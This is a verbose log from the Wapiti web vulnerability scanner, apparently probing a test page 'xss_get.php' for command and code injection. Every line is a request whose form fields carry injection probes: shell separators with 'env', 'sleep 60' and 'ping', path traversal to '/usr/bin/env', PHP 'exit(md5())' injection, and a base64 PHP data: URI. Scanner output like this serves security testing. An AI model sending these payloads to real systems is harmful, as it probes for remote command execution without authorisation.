2024-03-20 16:49:38.225 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.951 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=a%7Csleep%2060%3B&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.960 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=%26ping%20-n%2025%20127.0.0.1%26&firstname=fuzz&form=submit (0)
2024-03-20 16:49:38.968 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%3Benv%3B&form=submit (0)
2024-03-20 16:49:38.976 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%7Cenv%7C&form=submit (0)
2024-03-20 16:49:38.985 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=a%3Benv%3B&form=submit (0)
2024-03-20 16:49:38.993 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=a%3Benv%3B&form=submit (0)
2024-03-20 16:49:39.001 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&form=submit (0)
2024-03-20 16:49:39.010 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz%3Benv%3B&form=submit (0)
2024-03-20 16:49:39.018 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz%0Aenv%3B&form=submit (0)
2024-03-20 16:49:39.026 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%26set%26&form=submit (0)
2024-03-20 16:49:39.034 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=set&form=submit (0)
2024-03-20 16:49:39.043 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=env&form=submit (0)
2024-03-20 16:49:39.051 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%2Fe%00&form=submit (0)
2024-03-20 16:49:39.059 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
2024-03-20 16:49:39.067 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
2024-03-20 16:49:39.076 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
2024-03-20 16:49:39.084 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
2024-03-20 16:49:39.093 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
2024-03-20 16:49:39.103 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
2024-03-20 16:49:39.111 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
2024-03-20 16:49:39.120 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
2024-03-20 16:49:39.129 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
2024-03-20 16:49:39.138 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
2024-03-20 16:49:39.147 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
2024-03-20 16:49:39.156 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
2024-03-20 16:49:39.165 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&form=submit (0)
2024-03-20 16:49:39.174 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=a%60%29%60&form=submit (0)
2024-03-20 16:49:39.183 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=a%60sleep%2060%60&form=submit (0)
2024-03-20 16:49:39.192 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=a%3Bsleep%2060%3B&form=submit (0)
2024-03-20 16:49:39.200 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=a%7Csleep%2060%3B&form=submit (0)
2024-03-20 16:49:39.209 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=%26ping%20-n%2025%20127.0.0.1%26&form=submit (0)
2024-03-20 16:49:39.221 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%3Benv%3B (0)
2024-03-20 16:49:39.229 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%7Cenv%7C (0)
2024-03-20 16:49:39.239 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=a%3Benv%3B (0)
2024-03-20 16:49:39.249 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=a%3Benv%3B (0)
2024-03-20 16:49:39.258 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-20 16:49:39.268 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit%3Benv%3B (0)
2024-03-20 16:49:39.277 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit%0Aenv%3B (0)
2024-03-20 16:49:39.287 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%26set%26 (0)
2024-03-20 16:49:39.295 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=set (0)
2024-03-20 16:49:39.306 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=env (0)
2024-03-20 16:49:39.315 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%2Fe%00 (0)
2024-03-20 16:49:39.324 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:49:39.332 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:49:39.342 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:49:39.351 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:49:39.360 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:49:39.370 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:49:39.379 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:49:39.390 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:49:39.399 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:49:39.408 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:49:39.416 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:49:39.425 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:49:39.433 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-20 16:49:39.441 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=a%60%29%60 (0)
2024-03-20 16:49:39.449 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=a%60sleep%2060%60 (0)
2024-03-20 16:49:39.457 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=a%3Bsleep%2060%3B (0)
2024-03-20 16:49:39.465 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=a%7Csleep%2060%3B (0)
2024-03-20 16:49:39.473 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-20 16:49:39.489 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit (1)
2024-03-20 16:49:39.492 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%3Benv%3B&lastname=default&form=submit (1)
2024-03-20 16:49:39.502 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%7Cenv%7C&lastname=default&form=submit (1)
2024-03-20 16:49:39.511 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=a%3Benv%3B&lastname=default&form=submit (1)
2024-03-20 16:49:39.520 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=a%3Benv%3B&lastname=default&form=submit (1)
2024-03-20 16:49:39.529 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&lastname=default&form=submit (1)
2024-03-20 16:49:39.538 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default%3Benv%3B&lastname=default&form=submit (1)
2024-03-20 16:49:39.547 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default%0Aenv%3B&lastname=default&form=submit (1)
2024-03-20 16:49:39.555 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%26set%26&lastname=default&form=submit (1)
2024-03-20 16:49:39.565 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=set&lastname=default&form=submit (1)
2024-03-20 16:49:39.573 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=env&lastname=default&form=submit (1)
2024-03-20 16:49:39.582 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%2Fe%00&lastname=default&form=submit (1)
2024-03-20 16:49:39.591 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&lastname=default&form=submit (1)
2024-03-20 16:49:39.600 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&lastname=default&form=submit (1)
2024-03-20 16:49:39.610 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&lastname=default&form=submit (1)
2024-03-20 16:49:39.619 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&lastname=default&form=submit (1)
2024-03-20 16:49:39.635 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&lastname=default&form=submit (1)
2024-03-20 16:49:39.649 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&lastname=default&form=submit (1)
2024-03-20 16:49:39.662 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&lastname=default&form=submit (1)
2024-03-20 16:49:39.676 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&lastname=default&form=submit (1)
2024-03-20 16:49:39.690 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&lastname=default&form=submit (1)
2024-03-20 16:49:39.704 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&lastname=default&form=submit (1)
2024-03-20 16:49:39.719 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&lastname=default&form=submit (1)
2024-03-20 16:49:39.735 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&lastname=default&form=submit (1)
2024-03-20 16:49:39.750 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&lastname=default&form=submit (1)
2024-03-20 16:49:39.766 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=a%60%29%60&lastname=default&form=submit (1)
2024-03-20 16:49:39.781 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=a%60sleep%2060%60&lastname=default&form=submit (1)
2024-03-20 16:49:39.795 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=a%3Bsleep%2060%3B&lastname=default&form=submit (1)
2024-03-20 16:49:39.809 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=a%7Csleep%2060%3B&lastname=default&form=submit (1)
